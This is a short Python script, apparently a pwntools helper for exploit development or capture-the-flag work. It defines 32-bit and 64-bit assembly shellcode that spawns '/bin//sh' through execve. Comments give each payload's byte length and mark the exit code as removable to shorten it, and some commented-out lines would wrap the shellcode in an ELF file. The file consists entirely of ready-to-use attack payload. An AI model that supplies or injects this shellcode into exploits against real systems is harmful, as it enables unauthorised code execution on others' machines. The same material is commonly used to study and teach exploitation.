
from pwn import *
import shutil
import os
context(arch='amd64', os='linux', endian='little')

#current length of shellcode is 31 bytes, print len(asm(sc32))
sc32='''
_start:
    jmp string
shellcode:
    pop ebx
    xor ecx,ecx
    mul ecx
    mov edx,eax
    mov al,0xb
    int 0x80
    xor eax,eax #part from exit starts here, remove if need to shorten shellcode
    inc eax
    int 0x80

string:
    call shellcode
    .string "/bin//sh"
'''
#current length of shellcode is 33 bytes, print len(asm(sc64))
sc64='''
_start:
    jmp string
shellcode:
    mov rdx,rax
    pop rdi
    xor rsi,rsi
    mov al,0x3b
    syscall
    mov al,0x3c #part from exit starts here, remove if need to shorten shellcode
    xor edi,edi
    syscall
string:
    call shellcode
    .string "/bin//sh"
'''

#print (asm(sc))

# name="elf"
# location = make_elf_from_assembly(sc64, vma=0x400000)
# shutil.move(location, os.getcwd()+"/{}".format(name))
